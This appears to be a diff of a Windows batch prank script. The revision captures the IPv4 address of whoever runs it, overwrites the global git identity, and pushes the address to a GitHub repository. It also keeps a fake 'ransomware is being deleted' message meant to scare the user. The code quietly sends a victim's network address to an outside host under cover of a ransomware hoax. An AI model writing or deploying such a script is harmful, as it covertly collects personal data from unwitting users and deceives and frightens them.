@@ -1,23 +1,36 @@
 @echo off
 color a
 mode 1000
+setlocal EnableDelayedExpansion
 
-@echo off
-echo Capturing IP Address...
-ipconfig | find "IPv4 Address" > captured-ip.txt
-echo IP Address captured successfully.
+:: Capture IP address
+for /f "tokens=2 delims=:" %%a in ('ipconfig ^| find "IPv4 Address"') do (
+    set "ip=%%a"
+    set "ip=!ip:~1!"
+)
 
-echo Committing changes to GitHub...
-git add captured-ip.txt
-git commit -m "Update captured IP"
+:: Navigate to the directory of the batch file
+cd "%~dp0"
+
+:: Check if captured-ip directory exists, if not, create it
+if not exist captured-ip (
+    mkdir captured-ip
+)
+
+:: Output IP address to captured-ip.txt
+echo !ip! > captured-ip/captured_ip.txt
+
+:: Configure Git (replace with your GitHub username and email)
+git config --global user.email "your-email@example.com"
+git config --global user.name "Your Name"
+
+:: Add, commit, and push changes to GitHub
+git add captured-ip/captured_ip.txt
+git commit -m "Update captured IP address"
 git push origin main
-echo Changes committed and pushed to GitHub.
 
-echo Your files have been held hostage by ransomware...
-echo Would you like to delete the ransomware???
-set /p love=
-if %love%==yes goto hate
-:hate
+:: Pause to keep the command prompt window open for a moment
+pause
 
 ping 1.1.1.1 -n 5 -w 1000>NUL
 echo Ransomware is being deleted now....
